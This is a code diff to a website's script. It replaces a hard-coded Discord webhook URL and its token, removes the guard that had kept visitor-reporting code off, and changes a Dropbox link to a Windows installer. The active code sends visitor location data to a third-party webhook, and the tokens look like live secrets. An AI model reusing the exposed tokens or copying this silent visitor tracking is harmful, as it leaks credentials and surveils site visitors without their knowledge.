@@ -36,10 +36,10 @@ document.addEventListener('DOMContentLoaded', () => {
     document.head.appendChild(style);
 
     // === GLOBAL WEBHOOK LOGIC ===
-    const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1519771152560554014/7sA4WXOngoVy_Wcin8brkXAZmsPk8l1hpEWLQJrWlTKbiUjl9qghpHLLiQ-YtOhY_t-T';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1551026748639019098/v3zxV6WpZhhPCGscPA0I3VmIwgdY8qh7ti-qQRAi3HhL0noX5YpjBNZGcf__JYqnotuI';
 
     window.sendToWebhook = async function (action, extraData = '') {
-        if (!WEBHOOK_URL || WEBHOOK_URL === 'https://ptb.discord.com/api/webhooks/1519771152560554014/7sA4WXOngoVy_Wcin8brkXAZmsPk8l1hpEWLQJrWlTKbiUjl9qghpHLLiQ-YtOhY_t-T') return;
+        if (!WEBHOOK_URL) return;
 
         let country = "Unknown";
         let city = "Unknown";
@@ -218,7 +218,7 @@ function openDownload() {
     }
 
     // Navigate to download page or trigger download
-    window.open('https://www.dropbox.com/scl/fi/hhcxtip4leu1jtrw07566/BlindleeApp-Setup-1.0.0.exe?rlkey=5zp7o5tlgeac5wpba2dhog27z&st=dg1lxek7&dl=1', '_blank');
+    window.open('https://www.dropbox.com/scl/fi/o1sjr2xlmk0i4c8rdu9de/BlindleApp-Setup-1.0.0.exe?rlkey=04fbk4c4af03zqkqcvbgs45h4&st=97eh9o49&dl=1', '_blank');
 }
 
 // === LEGAL MODAL LOGIC ===
